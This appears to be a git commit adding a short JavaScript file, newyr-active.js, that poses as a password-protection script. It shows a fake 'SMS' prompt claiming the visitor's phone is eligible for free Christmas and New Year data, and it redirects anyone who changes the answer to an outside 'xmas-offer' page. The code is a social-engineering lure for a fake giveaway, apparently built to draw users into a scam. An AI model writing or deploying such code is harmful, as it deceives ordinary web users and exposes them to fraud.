69df205e759f804f955b3d7a16f033ad2b31ac34
mfednewblog9 <newekpeitid@gmail.com>
2025-12-16 09:45:32 +0100

    Create newyr-active.js

---
+++ newyr-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE FREE DATA'
+password = prompt(
+  'SMS: Congratulations! Your phone number is eligible to receive Free Data Xmas and New year offer. Please press OK to Activate now.',
+  'ACTIVATE FREE DATA'
+);
+if (password != 'ACTIVATE FREE DATA') {
+  location.href = 'https://fhreekift.org/xmas-offer.html';
+}
